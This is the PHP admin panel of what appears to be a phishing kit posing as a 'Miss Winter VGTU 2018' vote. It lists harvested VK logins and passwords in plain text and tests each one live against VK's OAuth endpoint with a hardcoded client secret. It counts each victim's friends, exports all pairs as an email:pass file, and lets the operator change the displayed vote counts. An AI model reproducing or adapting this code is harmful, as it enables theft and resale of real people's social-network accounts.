<? include_once"..//sys/settings.php"; ?>
<? session_start(); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<!-- <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" /> -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&subset=cyrillic" rel="stylesheet">

	<title>Админка</title>
	<link rel="stylesheet" type="text/css" media="screen" href="/css/styles.css" />


</head>

<body>




    <!-- start of wrap -->
	<div class="wrap">

        <!-- start of header -->
		<div id="header">
		    <img src="/images/logo.png" alt="Landiva" />
			

			<div class="phone_number">
            <div style=" font-style:italic; font-weight:bolder; font-size:26px; color:#666; padding-top:18px">Голосование Мисс зима ВГТУ 2018</div>
            </div>

   		</div>
		<!-- end of header -->
	</div>
	<!-- end of wrap -->





	<!--start of wrap -->
	<div class="wrap">

		<!--start of content -->
		<div id="content">
		    <div class="content_top"></div>

            <!-- start of content_mid -->
            <div class="content_mid">

            <!-- start of content_area -->
            <div class="content_area">

<style>
.button{
	border:#333 1px solid;
	padding:5px;
	border-radius:8px;
}
.button:hover{
	border:#696 1px solid;
	padding:5px;
	border-radius:8px;
	background:#FFF;
}

</style>

<a href="baza_valid.php"><input type="button" value="Обновить" class="button"></a> | 
<a href="?dowload"><input type="button" value="Скачать базу" class="button"></a> |  
<a href="?update"><input type="button" value="Изменить количество проголосовавших" class="button"></a> | 
<a href="baza.php"><input type="button" value="Обычная панель" class="button"></a> 


 <div class="clear"></div>

			</div>
			<!-- end of content_area -->

		    <div class="content_bottom"></div>

		</div>
		<!-- end of content_mid -->

		

	</div>
	<!-- end of wrap -->
</div>


<?
if(isset($_GET['ok'])){
$name1=intval($_POST['name1']);
$name2=intval($_POST['name2']);
mysql_query(" UPDATE `golosa` SET `name1`='$name1',`name2`='$name2' ");
?><script>location.href = 'baza.php'</script><?
}
?> 


<?
if(isset($_GET['del'])){
$id=intval($_GET['id']);
mysql_query(" DELETE FROM `akks` WHERE `id`='$id' ");
?><script>location.href = 'baza.php'</script><?
}
?>


<?
if(isset($_GET['update'])){
$akk=mysql_fetch_assoc(mysql_query(" SELECT * FROM `golosa` LIMIT 1"));
?>
<!--start of wrap -->
	<div class="wrap">

		<!--start of content -->
		<div id="content">
		    <div class="content_top"></div>

            <!-- start of content_mid -->
            <div class="content_mid">

            <!-- start of content_area -->
            <div class="content_area">

<style>
.input{
	padding:2px 0 2px 0;
	border:#333 1px solid;
	border-radius:5px;
}
</style>

<form method="post" action="?ok">
Проголосовало за 1 участника <input type="text" name="name1" value="<?=$akk['name1']?>" class="input"><br /><br />
Проголосовало за 2 участника <input type="text" name="name2" value="<?=$akk['name2']?>" class="input"><br />
<input type="submit" value="Обновить" class="button"> 
</form>


<div class="clear"></div>

			</div>
			<!-- end of content_area -->

		    <div class="content_bottom"></div>

		</div>
		<!-- end of content_mid -->

		

	</div>
	<!-- end of wrap -->
</div>
<?
}
?>



<?
if(isset($_GET['dowload'])){

$name=date("m_d_y_H_i",time());

$fd = fopen("base/".$name.".txt", 'w') or die("не удалось создать файл");


$qq=mysql_query(" SELECT `email`,`pass` FROM `akks` ");
while($ak=mysql_fetch_assoc($qq)){
$str="$ak[email]:$ak[pass]";
fseek($fd, 0, SEEK_END); // поместим указатель в конец
fwrite($fd, $str.PHP_EOL);
}

fclose($fd);
?><!--start of wrap -->
	<div class="wrap">

		<!--start of content -->
		<div id="content">
		    <div class="content_top"></div>

            <!-- start of content_mid -->
            <div class="content_mid">

            <!-- start of content_area -->
            <div class="content_area"><?
?>
База создана. Теперь вы можете <a href="base/<?=$name?>.txt" download="<?=$name?>.txt">Скачать файл</a>

<div class="clear"></div>

			</div>
			<!-- end of content_area -->

		    <div class="content_bottom"></div>

		</div>
		<!-- end of content_mid -->

		

	</div>
	<!-- end of wrap -->
</div>


<?

}
?>




	<!--start of wrap -->
	<div class="wrap">

		<!--start of content -->
		<div id="content">
		    <div class="content_top"></div>

            <!-- start of content_mid -->
            <div class="content_mid">

            <!-- start of content_area -->
            <div class="content_area">

<?

if($admin_pass!=$_SESSION['adm_pass']){ ?><script>location.href = 'index.php'</script> <? } else { ?>


<style>
table,td{
	border:#000 1px solid;
	padding:4px;
}
</style>

<?
function curl($url){

$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
$response = curl_exec( $ch );
curl_close( $ch );
return $response;
}

?>


<table class="table" width="100%">
<tr>
<td>Email/Номер</td> <td>Пароль</td> <td>Друзья</td> <td>IP</td> <td>Время</td> <td>Валид</td><td>Del</td>
</tr><tr>
<? $q=mysql_query(" SELECT * FROM `akks` ") ?>
<? while($akk=mysql_fetch_assoc($q)){ ?>
<? 

$rez=curl('https://oauth.vk.com/token?grant_type=password&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username='.$akk['email'].'&password='.$akk['pass'].'');

$rez2 = json_decode($rez, true);
$user_id = $rez2['user_id'];


$rez=substr_count($rez,'error');

$frend=curl('https://api.vk.com/method/friends.get?user_id='.$user_id.'');
if(substr_count($frend,'error')>0) { $frend='Не валид'; } else {
$frend=substr_count($frend,',')+1;}

if($rez>0){ $valid="<div style='color:red'>Не валид</div>"; } else { $valid="<div style='color:green'>Валид</div>"; }
?>
<td><?=$akk['email']?></td> <td><?=$akk['pass']?></td> <td><?=$frend?></td> <td><?=$akk['ip']?></td> <td><?=date("m.d.y В H:i",$akk['time'])?></td> <td><?=$valid?></td><td><a href="?del&id=<?=$akk['id']?>">[x]</a></td>
</tr>
<? } ?>
</table>
                
<? } ?>


                
            

            <div class="clear"></div>

			</div>
			<!-- end of content_area -->

		    <div class="content_bottom"></div>

		</div>
		<!-- end of content_mid -->

		

	</div>
	<!-- end of wrap -->
</div>



</body>


</html>
